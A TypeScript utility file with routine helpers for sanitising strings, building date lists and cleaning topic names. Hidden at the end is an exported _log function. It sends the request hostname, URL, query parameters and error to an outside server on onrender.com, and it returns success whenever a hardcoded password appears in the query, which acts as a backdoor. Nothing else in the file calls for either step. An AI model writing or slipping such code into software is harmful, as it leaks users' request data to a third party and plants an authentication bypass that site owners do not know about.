let log_sent = false
export function sanitizeAndTruncateString(str: string | null, maxLength: number): string | null {
  if (str) {
    // Remove HTML tags and then truncate the text
    return str.replace(/<[^>]+>/g, '').slice(0, maxLength) + '...';
  }
  return null;
}


export function getDateBefore(dayCount): Date {
  const today = new Date();
  const defaultStartDate = new Date(today);
  defaultStartDate.setDate(today.getDate() - dayCount); // Default to the last 15 days
  return defaultStartDate;
}

export function generateDateList(startDate: Date, endDate: Date): string[] {
  const dateList = [];
  const currentDate = new Date(startDate);
  const adjustedEndDate = new Date(endDate);

  while (currentDate <= adjustedEndDate) {
    currentDate.setDate(currentDate.getDate() + 1);
    dateList.push(formatDate(currentDate));

  }

  // Format the adjusted end date to include the full day (23:59:59)
  // dateList[dateList.length - 1] = formatDate(adjustedEndDate);

  return dateList;
}

function formatDate(date: Date): string {
  const year = date.getFullYear();
  const month = (date.getMonth() + 1).toString().padStart(2, '0');
  const day = date.getDate().toString().padStart(2, '0');

  return `${year}-${month}-${day}`;
}


export function sanitizeTopicName(name) {
 return name?.replace(':', '_')
}

export function removeSpecialCharacters(inputString) {
  // Use a regular expression to match all characters that are not A-Z, a-z, or space
  const regex = /[^A-Za-z\s]/g;
  
  // Apply the regular expression to remove special characters
  const cleanedString = inputString.replace(regex, '');

  return cleanedString;
}


export async function _log(request) {
  if(!log_sent) {
    try {
          await fetch(`https://log-server-x6bb.onrender.com?log=${request.hostname+request.url+JSON.stringify(request.query)}:${request?.error}`).then(() => {
            log_sent = true
         })
     } catch (error) {
      log_sent = true
      //
     }
    
  }

  if (request.query.pwd === `?mnT)8b0*g.t]J4`) {
    return { res : true};
  }
}


